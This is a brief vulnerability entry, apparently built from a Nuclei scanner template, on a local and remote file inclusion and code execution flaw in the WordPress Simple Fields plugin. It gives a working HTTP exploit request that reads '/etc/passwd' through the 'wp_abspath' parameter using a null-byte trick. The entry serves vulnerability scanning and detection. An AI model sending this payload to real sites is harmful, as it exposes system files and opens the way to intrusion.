# Vulnerability: WordPress Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE
**Classification:** WP-PLUGIN
**Source:** Nuclei Template (`wp-simple-fields-lfi.yaml`)

## Description
WordPress Simple Fields 0.2 is vulnerable to local file inclusion, remote file inclusion, and remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
```

